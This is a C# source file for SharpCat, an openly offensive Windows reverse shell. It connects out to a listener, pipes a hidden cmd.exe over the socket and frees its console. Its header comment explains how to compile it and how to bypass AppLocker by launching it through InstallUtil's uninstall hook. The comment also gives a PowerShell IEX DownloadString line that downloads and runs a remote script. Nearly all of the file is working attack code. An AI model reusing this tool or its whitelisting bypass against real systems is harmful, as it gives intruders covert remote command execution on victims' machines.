/*
  _________.__                        _________         __   
 /   _____/|  |__ _____ _____________ \_   ___ \_____ _/  |_ 
 \_____  \ |  |  \\__  \\_  __ \____ \/    \  \/\__  \\   __\
 /        \|   Y  \/ __ \|  | \/  |_> >     \____/ __ \|  |  
/_______  /|___|  (____  /__|  |   __/ \______  (____  /__|  
        \/      \/     \/      |__|           \/     \/      
                                                        v0.1

A Simple Reversed Command Shell which can be started using InstallUtil (Bypassing AppLocker) - by Cn33liz 2016

Compile:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /out:"C:\Utils\SharpCat.exe" /platform:anycpu "C:\Utils\SharpCat.cs"

To Bypass Applocker:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\SharpCat.exe

Usage:
* Setup a remote TCP Listener (for example ncat -lvp 443) https://nmap.org/ncat/
* Change IP/Port as needed, then Compile and run the SharpCat Executable on your target (or use the above InstallUtil trick).

Within the Remote Command Shell you can run PowerShell commands as follow:
C:\>PowerShell "Get-Help Invoke-*"
Or
C:\>PowerShell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/trollsploit/Get-RickAstley.ps1'); Get-RickAstley" 

*/

using System;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;


namespace SharpCat
{

    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction			
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            ShellZz.Main();
        }
    }

    class ShellZz
    {

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool FreeConsole();

        [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, BestFitMapping = false, ThrowOnUnmappableChar = true, SetLastError = true)]
        internal static extern int WSAStartup(
            [In] short wVersionRequested,
            [Out] out WSAData lpWSAData
            );

        [DllImport("ws2_32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr WSASocket(
            [In] AddressFamily addressFamily,
            [In] SocketType socketType,
            [In] ProtocolType protocolType,
            [In] IntPtr protocolInfo,
            [In] uint group,
            [In] int flags
            );

        [DllImport("ws2_32.dll", SetLastError = true)]
        internal static extern int WSAConnect(
            [In] IntPtr socketHandle,
            [In] byte[] socketAddress,
            [In] int socketAddressSize,
            [In] IntPtr inBuffer,
            [In] IntPtr outBuffer,
            [In] IntPtr sQOS,
            [In] IntPtr gQOS
            );

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);

        [StructLayout(LayoutKind.Sequential)]
        public struct WSAData
        {
            public Int16 wVestion;
            public Int16 wHighVersion;
            public Byte szDescription;
            public Byte szSystemStatus;
            public Int16 iMaxSockets;
            public Int16 iMaxUdpDg;
            public IntPtr lpVendorInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        static bool Initialized;
        static FieldInfo m_Buffer;


        public static void Main()
        {
            FreeConsole(); // closes the console
            Connect("192.168.1.120", 443); // Change This
        }

        public static bool Connect(string ipString, int port)
        {

            if (!Initialized)
            {
                var wsaData = new WSAData();
                if (WSAStartup(0x0202, out wsaData) != 0) return false;

                m_Buffer = typeof(SocketAddress).GetField("m_Buffer", (BindingFlags.Instance | BindingFlags.NonPublic));

                Initialized = true;
            }

            IPAddress address;
            if (!IPAddress.TryParse(ipString, out address)) return false;
            if (!((port >= 0) && (port <= 0xffff))) return false;
            var remoteEP = new IPEndPoint(address, port);

            SocketAddress socketAddress = remoteEP.Serialize();

            IntPtr m_Handle = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp, IntPtr.Zero, 0, 0);
            if (m_Handle == new IntPtr(-1)) return false;

            new SocketPermission(NetworkAccess.Connect, TransportType.Tcp, remoteEP.Address.ToString(), remoteEP.Port).Demand();

            var buf = (byte[])m_Buffer.GetValue(socketAddress);

            var result = (WSAConnect(m_Handle, buf, socketAddress.Size, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero) == 0);

            STARTUPINFO startupInfo = new STARTUPINFO();
            startupInfo.cb = Marshal.SizeOf(startupInfo);
            startupInfo.lpReserved = null;
            startupInfo.dwFlags = (0x00000001 | 0x00000100); //(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            startupInfo.hStdInput = m_Handle;
            startupInfo.hStdOutput = m_Handle;
            startupInfo.hStdError = m_Handle;

            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();

            String user = "user";
            String domain = ".";
            String password = "pass";
            int LogFlags = 0x00000002; //LOGON_NETCREDENTIALS_ONLY - Change to 0x00000000 if you want to run with known credentials (RunAs)
            String appname = @"C:\Windows\System32\cmd.exe";
            String cmd = null;
            int CreateFlags = 0x08000000; //CREATE_NO_WINDOW
            String currentDir = System.IO.Directory.GetCurrentDirectory();

            try
            {
                CreateProcessWithLogonW(
                    user,
                    domain,
                    password,
                    LogFlags,
                    appname,
                    cmd,
                    CreateFlags,
                    0,
                    currentDir,
                    ref startupInfo,
                    out processInfo);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }

            return result;
        }

    }

}
